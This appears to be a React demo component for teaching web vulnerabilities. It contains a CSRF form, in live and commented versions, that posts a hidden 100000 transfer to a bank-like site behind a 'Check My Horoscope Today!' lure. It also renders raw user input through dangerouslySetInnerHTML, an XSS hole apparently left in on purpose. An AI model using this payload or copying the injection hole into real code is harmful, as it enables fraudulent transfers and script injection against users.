import React, { useState } from 'react';

const Eval2 = () => {
  const [inputValue, setInputValue] = useState('');
  const [htmlContent, setHtmlContent] = useState('');

  const handleInputChange = (e) => {
    setInputValue(e.target.value);
  };

  const handleSubmit = () => {
    // Process the inputValue if needed
    // For example, you can set it as HTML content
    setHtmlContent(inputValue);
  };

  return (
    <div className='container mt-5'>
        <p> Click to see result CSRF Attack:
            <form action="https://money123.com/transfer?acct=Kevin123&AccctId&amount=100000" method="POST">
<input type="hidden" name="acct" value="Kevin123" />
<input type="hidden" name="amount" value="100000" />
<button type="submit" value="Check My Horoscope Today!" ></button>
</form></p>
      <input
        type="text"
        value={inputValue}
        onChange={handleInputChange}
        placeholder="Enter text"
      />
      <button onClick={handleSubmit}>Submit</button>
      <div>
        {/* Display HTML content */}
        <div dangerouslySetInnerHTML={{ __html: htmlContent }}></div>
      </div>
    </div>
  );
};

export default Eval2;

{/* <form action="https://money123.com/transfer?acct=Kevin123&AccctId&amount=100000" method="POST">
<input type="hidden" name="acct" value="Kevin123" />
<input type="hidden" name="amount" value="100000" />
<button type="submit" value="Check My Horoscope Today!" ></button>
</form> 

<a href="https://money123.com/transfer?acct=Kevin123&amount=100000">Check My Horoscope Today!</a>


*/}